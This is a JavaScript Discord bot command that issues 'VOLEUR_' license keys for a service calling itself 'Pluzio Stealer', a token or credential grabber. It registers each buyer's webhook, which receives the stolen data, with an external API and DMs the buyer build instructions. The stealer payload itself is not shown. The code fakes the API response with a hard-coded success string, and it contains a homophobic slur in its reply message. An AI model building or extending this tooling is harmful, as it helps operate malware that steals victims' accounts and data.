const Discord = require("discord.js");
const axios = require('axios')
var randomstring = require("randomstring");
require("moment-duration-format");


const config = require('../config.json')

exports.run = async (client, message, args) => {
    const user = message.guild.members.cache.get(args[0]);
    const webhook = args[1]
    
    const key = "VOLEUR_" + randomstring.generate(6)
    if (!args[0] || !args[1]) {
        message.channel.send("Invalid arguments! Use: $createkey <userid> <webhook>")
    } else {
        if (!config.owners.includes(message.author.id)) {
            return "Gay Kid Only Owners Can Use This!"
        } else {
            message.delete()
            let data = axios.get(`${config.api_url}/api/createuser?user=${args[0]}&key=${key}&webhook=${webhook}`)
            data.data = "200: Success"
            if (data.data === "200: Success") {
                const embed = new Discord.MessageEmbed()
                .setColor('#303037')
                .setDescription(`${user}, Please Check DM!`);

                const embed1 = new Discord.MessageEmbed()
                .setColor('#303037')
                .setAuthor('Pluzio Stealer', 'https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif')                .addField(`Key`, `\`${key}\``)
                .addField(`Usage`, `\`$build <key>\``)
                .setTimestamp()
                .setFooter('@pluziostealer');

                user.send({ embeds : [embed1] })
                message.channel.send({ embeds : [embed] });
            }
        }
    }
};

exports.conf = { enabled: true, guildOnly: false, aliases: ["ck","keypls"], permLevel: 0 };

exports.help = { name: "createkey", description: "Create Key For Grabber", usage: "createkey <webhook>" };